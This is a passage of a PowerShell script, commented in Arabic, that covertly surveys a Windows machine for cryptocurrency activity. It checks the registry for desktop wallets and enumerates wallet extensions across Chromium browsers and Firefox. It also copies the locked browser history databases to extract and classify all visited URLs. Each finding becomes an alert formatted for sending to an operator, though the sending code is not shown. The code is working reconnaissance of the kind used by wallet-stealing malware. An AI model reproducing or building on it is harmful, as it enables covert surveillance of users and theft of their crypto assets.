    $totalPages = [int][math]::Floor($B.Length / $pageSize)

    $master = New-Object System.Collections.Generic.List[object]
    Walk-TableBtree $B 1 $pageSize $usable $totalPages $enc $master

    $rootPage = 0
    $sql = $null
    foreach ($r in $master) {
        if ($r.Count -ge 5 -and "$($r[1])" -eq $Table) { $rootPage = [int]$r[3]; $sql = "$($r[4])" }
    }
    if ($rootPage -eq 0) { return @{ Columns = @(); Rows = @() } }

    $rows = New-Object System.Collections.Generic.List[object]
    Walk-TableBtree $B $rootPage $pageSize $usable $totalPages $enc $rows

    $cols = @()
    if ($sql) {
        $open = $sql.IndexOf('(')
        $close = $sql.LastIndexOf(')')
        if ($open -ge 0 -and $close -gt $open) {
            $inner = $sql.Substring($open + 1, $close - $open - 1)
            $parts = New-Object System.Collections.Generic.List[string]
            $depth = 0; $cur = ''
            foreach ($ch in $inner.ToCharArray()) {
                if ($ch -eq '(' -or $ch -eq '[') { $depth++ }
                elseif ($ch -eq ')' -or $ch -eq ']') { $depth-- }
                if ($ch -eq ',' -and $depth -eq 0) { $parts.Add($cur); $cur = '' }
                else { $cur += $ch }
            }
            $parts.Add($cur)
            foreach ($p in $parts) {
                $tt = $p.Trim().Trim('"', '[', ']', '`')
                if ($tt.Length -eq 0) { continue }
                $name = ($tt -split '\s+')[0].Trim('"', '[', ']', '`')
                $up = $name.ToUpperInvariant()
                if ($up -in @('PRIMARY', 'UNIQUE', 'CHECK', 'FOREIGN', 'CONSTRAINT')) { continue }
                $cols += $name
            }
        }
    }
    return @{ Columns = $cols; Rows = $rows.ToArray() }
}

function Copy-LockedFile {
    <# نسخ ملف قيد الاستخدام (متصفح مفتوح) عبر مشاركة القراءة - بدون تعديل المصدر. #>
    param([string]$Source, [string]$Dest)
    $fs = [System.IO.File]::Open($Source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    try {
        $out = [System.IO.File]::Create($Dest)
        try { $fs.CopyTo($out) } finally { $out.Dispose() }
    } finally { $fs.Dispose() }
}

function ConvertFrom-WebkitTime {
    <# ميكروثانية منذ 1601-01-01 (Chrome / Edge / Brave / Vivaldi / Opera / Chromium). #>
    param([long]$Micros)
    if ($Micros -le 0) { return $null }
    try {
        if ($Micros -gt 265046774399999999) { return $null }
        return ([datetime]::FromFileTimeUtc([long]($Micros * 10))).ToLocalTime()
    } catch { return $null }
}

function ConvertFrom-UnixMicros {
    <# ميكروثانية منذ 1970-01-01 (Firefox moz_places.last_visit_date). #>
    param([long]$Micros)
    if ($Micros -le 0) { return $null }
    try {
        $base = [datetime]::new(1970, 1, 1, 0, 0, 0, ([System.DateTimeKind]::Utc))
        return $base.AddSeconds([double]($Micros / 1000000.0)).ToLocalTime()
    } catch { return $null }
}


# =====================================================================
#  9)  فحص 1: البرامج المثبتة (الريجستري) -> محافظ سطح المكتب
# =====================================================================

function Invoke-InstalledProgramScan {
    Write-Log 'فحص البرامج المثبتة (الريجستري)...'

    $keywords = @(Get-Prop $Script:Wallets 'desktop_wallets' @())
    if ($keywords.Count -eq 0) { Write-Log 'قائمة desktop_wallets فارغة.' 'WARN'; return }

    $paths = @(
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    $scanned = 0
    foreach ($p in $paths) {
        try { $items = @(Get-ItemProperty -Path $p -ErrorAction Stop) }
        catch { Add-Error "تعذّر قراءة مسار الريجستري '$p': $($_.Exception.Message)"; continue }

        foreach ($it in $items) {
            $scanned++
            $dn = [string](Get-Prop $it 'DisplayName' '')
            if ([string]::IsNullOrWhiteSpace($dn)) { continue }

            $kw = Get-MatchedKeyword -Text $dn -Keywords $keywords
            if (-not $kw) { continue }

            $ver  = [string](Get-Prop $it 'DisplayVersion' '')
            $date = [string](Get-Prop $it 'InstallDate' '')
            $loc  = [string](Get-Prop $it 'InstallLocation' '')
            $pub  = [string](Get-Prop $it 'Publisher' '')

            if ($date -match '^(\d{4})(\d{2})(\d{2})$') { $date = "$($Matches[1])-$($Matches[2])-$($Matches[3])" }

            $msg = @()
            $msg += '🔴 <b>اكتشاف جديد: محفظة سطح مكتب</b>'
            $msg += '━━━━━━━━━━━━━━━━'
            $msg += "📛 الاسم: <code>$(ConvertTo-HtmlSafe (Limit-Text $dn 90))</code>"
            $msg += "📦 الإصدار: $(ConvertTo-HtmlSafe (Limit-Text $ver 40))"
            $msg += "📅 تاريخ التثبيت: $(ConvertTo-HtmlSafe (Limit-Text $date 30))"
            if ($loc) { $msg += "📁 المسار: <code>$(ConvertTo-HtmlSafe (Limit-Text $loc 160))</code>" }
            if ($pub) { $msg += "🏢 الناشر: $(ConvertTo-HtmlSafe (Limit-Text $pub 80))" }
            $msg += "🔎 الكلمة المفتاحية: <code>$(ConvertTo-HtmlSafe $kw)</code>"
            $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
            $msg += "🕒 وقت الاكتشاف: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"

            $key = "registry|$dn|$ver|$loc"
            $isNew = Register-Finding -Type 'desktop' -Key $key -Label $dn -Message ($msg -join "`n")
            if ($isNew) { Add-DailyCounter -Type 'desktop' }
            Write-Log "محفظة سطح مكتب: $dn $ver" 'INFO'
        }
    }
    Write-Log "تم فحص $scanned سجل برنامج مثبّت."
}

# =====================================================================
#  10)  فحص 2: إضافات المتصفحات
# =====================================================================

function Resolve-ExtensionMessage {
    param([string]$Message, [string]$ExtVersionDir, [string]$DefaultLocale)
    if ([string]::IsNullOrWhiteSpace($Message)) { return '' }
    if ($Message -notmatch '^__MSG_(.+)__$') { return $Message }

    $key = $Matches[1]
    $localesRoot = Join-Path $ExtVersionDir '_locales'
    if (-not (Test-Path -LiteralPath $localesRoot)) { return $Message }

    $candidates = New-Object System.Collections.ArrayList
    if ($DefaultLocale) { [void]$candidates.Add($DefaultLocale) }
    foreach ($d in @(Get-ChildItem -LiteralPath $localesRoot -Directory -Force -ErrorAction SilentlyContinue)) {
        if (-not $candidates.Contains($d.Name)) { [void]$candidates.Add($d.Name) }
    }

    foreach ($loc in $candidates) {
        $f = Join-Path (Join-Path $localesRoot $loc) 'messages.json'
        if (-not (Test-Path -LiteralPath $f)) { continue }
        try {
            $j = Read-JsonFile $f
            $entry = $j.PSObject.Properties[$key]
            if ($entry -and $entry.Value -and $entry.Value.message) { return [string]$entry.Value.message }
        } catch { }
    }
    return $Message
}

function Get-ChromiumPreferencesExtensions {
    param([string]$ProfileDir)
    $result = @{}
    foreach ($fileName in @('Secure Preferences', 'Preferences')) {
        $p = Join-Path $ProfileDir $fileName
        if (-not (Test-Path -LiteralPath $p)) { continue }
        try {
            $fi = Get-Item -LiteralPath $p -ErrorAction Stop
            if ($fi.Length -gt 40MB) { Write-Log "تخطّي $fileName (حجم كبير جدًا: $([int]($fi.Length/1MB))MB)" 'DEBUG'; continue }
            $j = Read-JsonFile $p
        } catch {
            Add-Error "تعذّر قراءة $fileName في $ProfileDir : $($_.Exception.Message)"
            continue
        }

        $ext = Get-Prop $j 'extensions' $null
        $settings = Get-Prop $ext 'settings' $null
        if (-not $settings) { continue }

        foreach ($prop in $settings.PSObject.Properties) {
            $id = $prop.Name
            if ($id -eq 'nmmhkkegccagdldgiimedpiccmgmieda' -or $id.Length -ne 32) { continue }
            $val = $prop.Value
            $mf = Get-Prop $val 'manifest' $null
            $name = ''
            if ($mf) { $name = Resolve-ExtensionMessage -Message ([string](Get-Prop $mf 'name' '')) -ExtVersionDir $ProfileDir -DefaultLocale ([string](Get-Prop $mf 'default_locale' 'en')) }
            $ver = [string](Get-Prop $mf 'version' (Get-Prop $val 'manifest.version' ''))
            $state = [int](Get-Prop $val 'state' 0)

            $result[$id] = @{ name = $name; version = $ver; state = $state; from = $fileName }
        }
    }
    return $result
}

function Get-ChromiumDiskExtensions {
    param([string]$ProfileDir, [string]$ProfileName, [string]$BrowserName)

    $out = New-Object System.Collections.ArrayList
    $extRoot = Join-Path $ProfileDir 'Extensions'
    if (-not (Test-Path -LiteralPath $extRoot)) { return @() }

    foreach ($idDir in @(Get-ChildItem -LiteralPath $extRoot -Directory -Force -ErrorAction SilentlyContinue)) {
        $versionDirs = @(Get-ChildItem -LiteralPath $idDir.FullName -Directory -Force -ErrorAction SilentlyContinue |
                         Where-Object { $_.Name -notlike '_*' } |
                         Sort-Object { [string]$_.Name } -Descending)

        $manifestPath = $null; $verDirFull = $null
        foreach ($vd in $versionDirs) {
            $mp = Join-Path $vd.FullName 'manifest.json'
            if (Test-Path -LiteralPath $mp) { $manifestPath = $mp; $verDirFull = $vd.FullName; break }
        }
        if (-not $manifestPath) { continue }

        try { $mf = Read-JsonFile $manifestPath } catch { continue }

        $rawName = [string](Get-Prop $mf 'name' '')
        $name = Resolve-ExtensionMessage -Message $rawName -ExtVersionDir $verDirFull -DefaultLocale ([string](Get-Prop $mf 'default_locale' 'en'))
        $desc = Resolve-ExtensionMessage -Message ([string](Get-Prop $mf 'description' '')) -ExtVersionDir $verDirFull -DefaultLocale ([string](Get-Prop $mf 'default_locale' 'en'))
        $ver  = [string](Get-Prop $mf 'version' '')

        $perms = @()
        $perms += @(Get-Prop $mf 'permissions' @())
        $perms += @(Get-Prop $mf 'host_permissions' @())
        $perms = @($perms | Where-Object { $_ } | Select-Object -Unique)

        [void]$out.Add([PSCustomObject]@{
            Id          = $idDir.Name
            Name        = $name
            RawName     = $rawName
            Version     = $ver
            Description = $desc
            Permissions = $perms
            Profile     = $ProfileName
            Browser     = $BrowserName
            Path        = $verDirFull
        })
    }
    return $out
}

function Get-ChromiumProfiles {
    param([string]$UserDataDir)
    $profiles = New-Object System.Collections.ArrayList
    $skip = @('System Profile', 'Guest Profile', 'Snapshots', 'ShaderCache', 'GrShaderCache',
              'GraphiteDawnCache', 'BrowserMetrics', 'Crashpad', 'SwReporter', 'WidevineCdm',
              'component_crx_cache', 'extensions_crx_cache', 'optimization_guide_model_store')
    foreach ($d in @(Get-ChildItem -LiteralPath $UserDataDir -Directory -Force -ErrorAction SilentlyContinue)) {
        if ($skip -contains $d.Name) { continue }
        $hasHistory = Test-Path -LiteralPath (Join-Path $d.FullName 'History')
        $hasExt     = Test-Path -LiteralPath (Join-Path $d.FullName 'Extensions')
        $hasPrefs   = (Test-Path -LiteralPath (Join-Path $d.FullName 'Preferences')) -or (Test-Path -LiteralPath (Join-Path $d.FullName 'Secure Preferences'))
        if ($hasHistory -or $hasExt -or $hasPrefs) { [void]$profiles.Add($d) }
    }
    return $profiles
}

function New-ExtensionMessage {
    param(
        [string]$Name, [string]$Version, [string]$Browser, [string]$Profile,
        [string]$ExtId, [string]$State, [string]$Permissions, [string]$Description, [string]$Source
    )
    $msg = @()
    $msg += '🟠 <b>اكتشاف جديد: إضافة محفظة في المتصفح</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🧩 الإضافة: <b>$(ConvertTo-HtmlSafe (Limit-Text $Name 90))</b>"
    $msg += "📦 الإصدار: $(ConvertTo-HtmlSafe (Limit-Text $Version 30))"
    $msg += "🌐 المتصفح: $(ConvertTo-HtmlSafe $Browser)"
    $msg += "👤 البروفايل: <code>$(ConvertTo-HtmlSafe $Profile)</code>"
    if ($ExtId) { $msg += "🆔 المعرّف: <code>$(ConvertTo-HtmlSafe (Limit-Text $ExtId 120))</code>" }
    $msg += "📌 الحالة: $(ConvertTo-HtmlSafe $State)"
    if ($Source) { $msg += "📎 المصدر: $(ConvertTo-HtmlSafe $Source)" }
    if ($Permissions) { $msg += "🔑 الصلاحيات: <code>$(ConvertTo-HtmlSafe (Limit-Text $Permissions 350))</code>" }
    if ($Description) { $msg += "📝 الوصف: $(ConvertTo-HtmlSafe (Limit-Text $Description 150))" }
    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $msg += "🕒 وقت الاكتشاف: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
    return ($msg -join "`n")
}

function Invoke-BrowserExtensionScan {
    Write-Log 'فحص إضافات المتصفحات...'

    $extKeywords = @(Get-Prop $Script:Wallets 'browser_extensions' @())
    $totalExt = 0

    foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
        if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
        $browserName = [string](Get-Prop $br 'name' 'Chromium')
        $userData = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
        if (-not $userData -or -not (Test-Path -LiteralPath $userData)) { continue }

        foreach ($prof in (Get-ChromiumProfiles -UserDataDir $userData)) {
            $diskExts = @()
            try { $diskExts = @(Get-ChromiumDiskExtensions -ProfileDir $prof.FullName -ProfileName $prof.Name -BrowserName $browserName) }
            catch { Add-Error "فشل فحص إضافات $browserName/$($prof.Name): $($_.Exception.Message)" }

            $prefExts = @{}
            try { $prefExts = Get-ChromiumPreferencesExtensions -ProfileDir $prof.FullName }
            catch { Add-Error "فشل قراءة Preferences لـ $browserName/$($prof.Name): $($_.Exception.Message)" }

            $seenIds = New-Object 'System.Collections.Generic.HashSet[string]'

            foreach ($e in $diskExts) {
                $totalExt++
                [void]$seenIds.Add($e.Id)

                $name = $e.Name
                $ver  = $e.Version
                $stateTxt = 'مُفعّلة (على القرص)'
                if ($prefExts.ContainsKey($e.Id)) {
                    $pe = $prefExts[$e.Id]
                    if ($name -like '__MSG_*' -or [string]::IsNullOrWhiteSpace($name)) { if ($pe.name) { $name = $pe.name } }
                    if (-not $ver -and $pe.version) { $ver = $pe.version }
                    $stateTxt = switch ($pe.state) {
                        '0' { 'مُفعّلة' }
                        '1' { 'مُعطّلة' }
                        '2' { 'مُعطّلة من المستخدم' }
                        default { "state=$($pe.state)" }
                    }
                }

                $kw = Get-MatchedKeyword -Text "$name $($e.RawName) $($e.Description)" -Keywords $extKeywords
                if (-not $kw) { $kw = Get-MatchedKeyword -Text "$name" -Keywords $extKeywords }
                if (-not $kw) { continue }

                $permTxt = if ($e.Permissions.Count -gt 0) { ($e.Permissions -join ', ') } else { '' }
                $msg = New-ExtensionMessage -Name $name -Version $ver -Browser $browserName -Profile $e.Profile `
                    -ExtId $e.Id -State $stateTxt -Permissions $permTxt -Description $e.Description -Source ''

                $key = "chromium-ext|$browserName|$($e.Profile)|$($e.Id)"
                $isNew = Register-Finding -Type 'extension' -Key $key -Label "$name ($browserName/$($e.Profile))" -Message $msg
                if ($isNew) { Add-DailyCounter -Type 'extension' }
                Write-Log "إضافة محفظة: $name [$browserName/$($e.Profile)] $ver" 'INFO'
            }

            foreach ($id in $prefExts.Keys) {
                if ($seenIds.Contains($id)) { continue }
                $pe = $prefExts[$id]
                $kw = Get-MatchedKeyword -Text "$($pe.name)" -Keywords $extKeywords
                if (-not $kw) { continue }

                $msg = New-ExtensionMessage -Name $pe.name -Version $pe.version -Browser $browserName -Profile $prof.Name `
                    -ExtId $id -State 'غير موجودة على القرص' -Permissions '' -Description '' -Source "$($pe.from)"
                $key = "chromium-ext|$browserName|$($prof.Name)|$id"
                $isNew = Register-Finding -Type 'extension' -Key $key -Label "$($pe.name) ($browserName/$($prof.Name))" -Message $msg
                if ($isNew) { Add-DailyCounter -Type 'extension' }
            }
        }
    }

    # ---------- Firefox ----------
    $ff = Get-Prop $Script:Cfg 'firefox' $null
    if ($ff -and [bool](Get-Prop $ff 'enabled' $true)) {
        $ffRoot = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
        if ($ffRoot -and (Test-Path -LiteralPath $ffRoot)) {
            foreach ($prof in @(Get-ChildItem -LiteralPath $ffRoot -Directory -Force -ErrorAction SilentlyContinue)) {
                $extJson = Join-Path $prof.FullName 'extensions.json'
                if (-not (Test-Path -LiteralPath $extJson)) { continue }

                try { $j = Read-JsonFile $extJson }
                catch { Add-Error "تعذّر قراءة extensions.json لبروفايل فايرفوكس $($prof.Name): $($_.Exception.Message)"; continue }

                foreach ($a in @(Get-Prop $j 'addons' @())) {
                    if ([string](Get-Prop $a 'type' '') -ne 'extension') { continue }
                    $location = [string](Get-Prop $a 'location' '')
                    if ($location -in @('app-builtin', 'app-system-defaults', 'app-global')) { continue }

                    $totalExt++
                    $dl = Get-Prop $a 'defaultLocale' $null
                    $name = [string](Get-Prop $dl 'name' (Get-Prop $a 'id' ''))
                    $ver  = [string](Get-Prop $a 'version' '')
                    $active = Get-Prop $a 'active' $null

                    $kw = Get-MatchedKeyword -Text $name -Keywords $extKeywords
                    if (-not $kw) { continue }

                    $stateTxt = if ($active -eq $false) { 'مُعطّلة' } else { 'مُفعّلة' }
                    $msg = New-ExtensionMessage -Name $name -Version $ver -Browser 'Firefox' -Profile $prof.Name `
                        -ExtId ([string](Get-Prop $a 'id' '')) -State $stateTxt -Permissions '' -Description '' -Source ([string](Get-Prop $a 'path' ''))

                    $key = "firefox-ext|$($prof.Name)|$([string](Get-Prop $a 'id' ''))"
                    $isNew = Register-Finding -Type 'extension' -Key $key -Label "$name (Firefox/$($prof.Name))" -Message $msg
                    if ($isNew) { Add-DailyCounter -Type 'extension' }
                    Write-Log "إضافة محفظة: $name [Firefox/$($prof.Name)] $ver" 'INFO'
                }
            }
        }
    }

    Write-Log "تم فحص $totalExt إضافة (قبل الفلترة)."
}

# =====================================================================
#  11)  تصنيف الروابط (URL Classification)
# =====================================================================

function Normalize-HistoryUrl {
    <# مفتاح توحيد للرابط: بدون fragment وبدون شرطة أخيرة وبحروف صغيرة. #>
    param([string]$Url)
    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }
    $u = $Url.Trim()
    $i = $u.IndexOf('#')
    if ($i -ge 0) { $u = $u.Substring(0, $i) }
    $u = $u.TrimEnd('/')
    return $u.ToLowerInvariant()
}

function Get-UrlHost {
    param([string]$Url)
    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }
    $h = ''
    $m = [regex]::Match($Url, '^[a-zA-Z][a-zA-Z0-9+.\-]*://([^/:?#]+)')
    if ($m.Success) { $h = $m.Groups[1].Value }
    else {
        $m2 = [regex]::Match($Url, '^([^/:?#]+)')
        if ($m2.Success) { $h = $m2.Groups[1].Value }
    }
    return $h.ToLower().Trim()
}

function Test-DomainMatch {
    # تنبيه: لا يمكن تسمية باراميتر بـ $Host لأنه متغير تلقائي للقراءة فقط في PowerShell
    param([string]$HostName, [string[]]$Domains)
    if (-not $HostName) { return $false }
    foreach ($d in $Domains) {
        if ([string]::IsNullOrWhiteSpace($d)) { continue }
        $dd = $d.ToLower().Trim()
        if ($HostName -eq $dd) { return $true }
        if ($HostName.EndsWith('.' + $dd, [System.StringComparison]::Ordinal)) { return $true }
        # احتياطي: مطابقة الاحتواء للدومينات الطويلة
        if ($dd.Length -ge 6 -and $HostName.Contains($dd)) { return $true }
    }
    return $false
}

function Test-CryptoKeyword {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $false }
    $low = $Text.ToLower()
    $kws = @(Get-Prop $Script:Wallets 'crypto_keywords' @())
    foreach ($kw in $kws) {
        if ([string]::IsNullOrWhiteSpace($kw)) { continue }
        $k = $kw.ToLower()
        if ($k.Length -ge 5) {
            if ($low.Contains($k)) { return $true }
        } else {
            # كلمات قصيرة (eth/sol/btc/nft/dex/cex/bnb) بحدود واضحة لمنع المطابقات الخاطئة
            $pattern = '(^|[^a-z0-9])' + [regex]::Escape($k) + '([^a-z0-9]|$)'
            if ([regex]::IsMatch($low, $pattern)) { return $true }
        }
    }
    return $false
}

function Get-UrlCategory {
    param([string]$Url, [string]$Title = '')
    $host_ = Get-UrlHost $Url

    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'wallet_domains' @())) { return 'wallet' }
    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'exchanges_domains' @())) { return 'exchange' }
    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'dapp_domains' @())) { return 'dapp' }

    $text = "$host_ $Url $Title"
    if (Test-CryptoKeyword -Text $text) { return 'crypto' }
    return 'other'
}

function Get-CategoryMeta {
    param([string]$Category)
    switch ($Category) {
        'wallet'   { return @{ Order = 1; Icon = '🟣'; Title = 'محافظ (Wallets)' } }
        'exchange' { return @{ Order = 2; Icon = '🟠'; Title = 'منصات تداول (Exchanges)' } }
        'dapp'     { return @{ Order = 3; Icon = '🔵'; Title = 'تطبيقات لامركزية (DApps)' } }
        'crypto'   { return @{ Order = 4; Icon = '🟡'; Title = 'مواقع كريبتو (Crypto)' } }
        default    { return @{ Order = 5; Icon = '⚪'; Title = 'أخرى (Other)' } }
    }
}

# =====================================================================
#  12)  فحص 3: تاريخ المتصفحات (قارئ PowerShell مباشر -> كل الروابط)
# =====================================================================

function New-TempDir {
    $base = [string]$env:TEMP
    if ([string]::IsNullOrWhiteSpace($base)) { $base = [System.IO.Path]::GetTempPath() }
    if ([string]::IsNullOrWhiteSpace($base)) { $base = $Script:ScriptDir }
    $dir = Join-Path $base ("wm_{0}" -f ([guid]::NewGuid().ToString('N').Substring(0, 8)))
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    return $dir
}

function Get-HistoryHits {
    <# يسحب كل روابط التاريخ من كل المتصفحات (Chromium family + Firefox). #>
    $hc       = Get-Prop $Script:Cfg 'browser_history' $null
    $lookback = [int](Get-Prop $hc 'lookback_days' 30)
    $maxRows  = [int](Get-Prop $hc 'max_results_per_browser' 300)
    if ($maxRows -le 0) { $maxRows = 300 }
    $cutoff = $null
    if ($lookback -gt 0) { $cutoff = (Get-Date).AddDays(-$lookback) }

    $hits   = New-Object System.Collections.ArrayList
    $errors = New-Object System.Collections.ArrayList
    $stats  = New-Object System.Collections.ArrayList
    $tmpDir = New-TempDir

    try {
        # ---------- عائلة Chromium ----------
        foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
            if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
            $name = [string](Get-Prop $br 'name' 'Chromium')
            $ud = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
            if (-not $ud -or -not (Test-Path -LiteralPath $ud)) { continue }

            foreach ($prof in @(Get-ChromiumProfiles $ud)) {
                $hist = Join-Path $prof.FullName 'History'
                if (-not (Test-Path -LiteralPath $hist)) { continue }
                $tmp = Join-Path $tmpDir ("chromium_" + [guid]::NewGuid().ToString('N') + ".db")
                try {
                    Copy-LockedFile -Source $hist -Dest $tmp
                    $res  = Get-SqliteTableData -Path $tmp -Table 'urls'
                    $cols = @($res.Columns)
                    $iu = [array]::IndexOf($cols, 'url')
                    $it = [array]::IndexOf($cols, 'title')
                    $iv = [array]::IndexOf($cols, 'visit_count')
                    $il = [array]::IndexOf($cols, 'last_visit_time')
                    if ($iu -lt 0 -or $il -lt 0) { continue }
                    $n = 0
                    foreach ($row in @($res.Rows)) {
                        $u = [string]$row[$iu]
                        if ([string]::IsNullOrWhiteSpace($u)) { continue }
                        $dt = ConvertFrom-WebkitTime ([long]$row[$il])
                        if ($cutoff -and ($null -eq $dt -or $dt -lt $cutoff)) { continue }
                        $title = ''; if ($it -ge 0 -and $null -ne $row[$it]) { $title = [string]$row[$it] }
                        $vis = 0;    if ($iv -ge 0 -and $null -ne $row[$iv]) { $vis = [int]$row[$iv] }
                        [void]$hits.Add([PSCustomObject]@{ Browser = $name; Profile = $prof.Name; Url = $u; Title = $title; Visits = $vis; LastTs = $dt })
                        $n++
                        if ($n -ge $maxRows) { break }
                    }
                    [void]$stats.Add([PSCustomObject]@{ Browser = $name; Profile = $prof.Name; Count = $n })
                } catch {
                    [void]$errors.Add("$name/$($prof.Name): $($_.Exception.Message)")
                } finally {
                    if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
                }
            }
        }

        # ---------- Firefox ----------
        $ff = Get-Prop $Script:Cfg 'firefox' $null
        if ([bool](Get-Prop $ff 'enabled' $true)) {
            $root = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
            if ($root -and (Test-Path -LiteralPath $root)) {
                foreach ($prof in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
                    $places = Join-Path $prof.FullName 'places.sqlite'
                    if (-not (Test-Path -LiteralPath $places)) { continue }
                    $tmp = Join-Path $tmpDir ("firefox_" + [guid]::NewGuid().ToString('N') + ".db")
                    try {
                        Copy-LockedFile -Source $places -Dest $tmp
                        $res  = Get-SqliteTableData -Path $tmp -Table 'moz_places'
                        $cols = @($res.Columns)
                        $iu = [array]::IndexOf($cols, 'url')
                        $it = [array]::IndexOf($cols, 'title')
                        $iv = [array]::IndexOf($cols, 'visit_count')
                        $il = [array]::IndexOf($cols, 'last_visit_date')
                        if ($iu -lt 0 -or $il -lt 0) { continue }
                        $n = 0
                        foreach ($row in @($res.Rows)) {
                            $u = [string]$row[$iu]
                            if ([string]::IsNullOrWhiteSpace($u)) { continue }
                            $dt = $null
                            if ($null -ne $row[$il]) { $dt = ConvertFrom-UnixMicros ([long]$row[$il]) }
                            if ($cutoff -and ($null -eq $dt -or $dt -lt $cutoff)) { continue }
                            $title = ''; if ($it -ge 0 -and $null -ne $row[$it]) { $title = [string]$row[$it] }
                            $vis = 0;    if ($iv -ge 0 -and $null -ne $row[$iv]) { $vis = [int]$row[$iv] }
                            [void]$hits.Add([PSCustomObject]@{ Browser = 'Firefox'; Profile = $prof.Name; Url = $u; Title = $title; Visits = $vis; LastTs = $dt })
                            $n++
                            if ($n -ge $maxRows) { break }
                        }
                        [void]$stats.Add([PSCustomObject]@{ Browser = 'Firefox'; Profile = $prof.Name; Count = $n })
                    } catch {
                        [void]$errors.Add("Firefox/$($prof.Name): $($_.Exception.Message)")
                    } finally {
                        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
                    }
                }
            }
        }
    } finally {
        Remove-Item -LiteralPath $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    return @{ Hits = @($hits); Errors = @($errors); Stats = @($stats) }
}

function Invoke-BrowserHistoryScan {
    Write-Log 'فحص تاريخ المتصفحات (قارئ PowerShell مباشر - كل المتصفحات)...'
    $Script:HistoryHits     = @()
    $Script:NewHistoryCount = 0
    $Script:HistoryStats    = @()
    $Script:HistoryBrowsers = 0

    $res = Get-HistoryHits
    foreach ($e in @($res.Errors)) { Add-Error "history: $e" }
    $rawHits = @($res.Hits)
    $Script:HistoryStats = @($res.Stats)
    if ($rawHits.Count -eq 0 -and @($res.Errors).Count -gt 0) {
        Add-Error 'لم يتم استخراج أي رابط تاريخ. تأكد من وجود ملفات History / places.sqlite.'
    }
    Write-Log "روابط تاريخ المتصفح المستخرجة: $($rawHits.Count)"

    # دمج ذكي: نفس الرابط من أكثر من متصفح/بروفايل يصبح سطرًا واحدًا،
    # مع جمع أسماء المتصفحات وأخذ أعلى عدد زيارات وأحدث تاريخ زيارة.
    $classified = New-Object System.Collections.ArrayList
    $index = @{}
    $order = New-Object System.Collections.ArrayList
    foreach ($h in $rawHits) {
        $browser = [string]$h.Browser
        $profile = [string]$h.Profile
        $url     = [string]$h.Url
        if ([string]::IsNullOrWhiteSpace($url)) { continue }

        $norm = Normalize-HistoryUrl $url
        if ([string]::IsNullOrWhiteSpace($norm)) { $norm = $url.ToLowerInvariant() }

        $title = [string]$h.Title
        $dt    = $h.LastTs
        $vis   = [int](Get-Prop $h 'Visits' 0)
        if ($vis -lt 0) { $vis = 0 }

        if ($index.ContainsKey($norm)) {
            $ent = $index[$norm]
            if ($vis -gt $ent.Visits) { $ent.Visits = $vis }
            if ($dt -and (-not $ent.LastTs -or $dt -gt $ent.LastTs)) { $ent.LastTs = $dt }
            if ($browser -and ($ent.Browsers -notcontains $browser)) { [void]$ent.Browsers.Add($browser) }
            if (-not $ent.Title -and $title) { $ent.Title = $title }
        } else {
            $brs = New-Object System.Collections.ArrayList
            if ($browser) { [void]$brs.Add($browser) }
            $index[$norm] = [PSCustomObject]@{
                Url      = $url
                Title    = $title
                Visits   = $vis
                LastTs   = $dt
                Browsers = $brs
                Profile  = $profile
            }
            [void]$order.Add($norm)
        }
    }

    foreach ($norm in $order) {
        $ent    = $index[$norm]
        $brList = @($ent.Browsers | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
        $brText = ($brList -join ', ')
        if ([string]::IsNullOrWhiteSpace($brText)) { $brText = '(غير معروف)' }

        $lastTxt = 'غير معروف'
        if ($ent.LastTs) { try { $lastTxt = $ent.LastTs.ToString('yyyy-MM-dd HH:mm') } catch { } }

        $category = Get-UrlCategory -Url $ent.Url -Title $ent.Title
        $host_    = Get-UrlHost $ent.Url
        if ([string]::IsNullOrWhiteSpace($host_)) { $host_ = '(غير معروف)' }

        [void]$classified.Add([PSCustomObject]@{
            Browser  = $brText
            Browsers = $brList
            Profile  = $ent.Profile
            Url      = $ent.Url
            Title    = $ent.Title
            Visits   = [int]$ent.Visits
            Last     = $lastTxt
            LastTs   = $ent.LastTs
            Host     = $host_
            Category = $category
        })

        $isNew = Register-Finding -Type 'history' -Key "history|$norm" -Label (Limit-Text $ent.Url 120) -Message '' -Silent
        if ($isNew) { $Script:NewHistoryCount++; Add-DailyCounter -Type 'history' }
    }

    $Script:HistoryHits = @($classified)
    $Script:HistoryBrowsers = @($Script:HistoryStats | Where-Object { $_.Count -gt 0 }).Count
    Write-Log "روابط بعد إزالة التكرار: $($Script:HistoryHits.Count) (متصفح/بروفايل: $($Script:HistoryBrowsers))"
}

# =====================================================================
#  13)  فحص 4: نظام الملفات
# =====================================================================

function Test-FileNameMatch {
    param([string]$Name, [string[]]$Patterns)
